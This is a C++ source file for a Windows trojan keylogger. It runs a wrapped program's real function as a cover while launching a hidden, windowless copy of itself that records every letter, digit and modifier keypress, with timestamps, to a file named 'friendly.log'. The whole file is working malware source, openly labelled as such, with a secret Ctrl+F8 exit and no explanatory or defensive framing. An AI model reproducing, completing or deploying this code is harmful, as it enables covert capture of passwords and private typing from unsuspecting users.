#include <windows.h>
#include <future>
#include <vector>
#include <string>
#include "trojan.h"
#include <fstream>
#include <memory>
#include <ctime>

struct elem {
	char e;
	bool t;
	std::string elemt;
	elem(char ew, bool tw, std::string elemtw) :e(ew), t(tw), elemt(elemtw) {};
};

class hephistusMD {
private:
	std::ofstream* i;
	std::vector<elem> di;
public:
	bool gks(char e) { return GetKeyState(e) & 0x8000; }
	void hephistus(char begin, char end) {
		char xt[]{ 0x00,'\0' };
		for (char x = begin; x <= end; x++) {
			xt[0] = x;
			di.push_back(elem(x, gks(x), std::string(xt)));
		}
	}
	void add(char x, std::string s) {
		di.push_back(elem(x, gks(x), s));
	}
	void run() {
		bool c = 0;
		for (size_t e = 0; e < di.size(); e++) {
			c = gks(di[e].e);
			if (di[e].t != c) {
				std::time_t result = std::time(nullptr);
#pragma warning(suppress : 4996)
				char* t = std::asctime(std::localtime(&result));
				t[strlen(t) - 1] = '\0';
				(*i) << t << ";" << di[e].elemt << ";" << (c ? "Down" : "Up") << std::endl;
			}
			di[e].t = c;
		}
	}
	hephistusMD(std::ofstream* d) :i(d) {}
};

void malwareDeamon() {
	std::ofstream ofile("friendly.log", std::ios_base::app | std::ios_base::out);
	hephistusMD m(&ofile);

	m.hephistus(0x30, 0x39);
	m.hephistus(0x41, 0x5a);
	m.add(VK_TAB, "TAB");
	m.add(VK_BACK, "Backspace");
	m.add(VK_RETURN, "Newline");
	m.add(VK_SHIFT, "Shift");
	m.add(VK_CONTROL, "CTRL");
	m.add(VK_MENU, "Alt");
	m.add(VK_HOME, "WinKey");

	while (1) {
		m.run();
		//EXIT KEYLOGGER:
		if (m.gks(VK_F8) && m.gks(VK_CONTROL)) return;
		Sleep(1);
	}
	ofile.close();
}

int main(int argc, char* argv[])
{
	const char* agv[]{ "hephistus", "run" };
	if (argc > 2 && std::string(argv[2]) == agv[1] && std::string(argv[1]) == agv[0]) {
		malwareDeamon();
		return 0;
	}
	std::future<int> fut = std::async(om, argc, argv);
	{
		std::string codec = (std::string(argv[0]) + " " + agv[0] + " " + agv[1]);
		size_t s = sizeof(char) * (1 + codec.length());
		char* tld = (char*)malloc(s);
		if (tld == nullptr) goto skiphephistus;
		strcpy_s(tld, s, codec.c_str());

		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		if (!CreateProcessA(NULL,   // No module name (use command line)
			tld,        // Command line
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi)           // Pointer to PROCESS_INFORMATION structure
			) malwareDeamon();
		free(tld);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
skiphephistus:
	return fut.get();
}
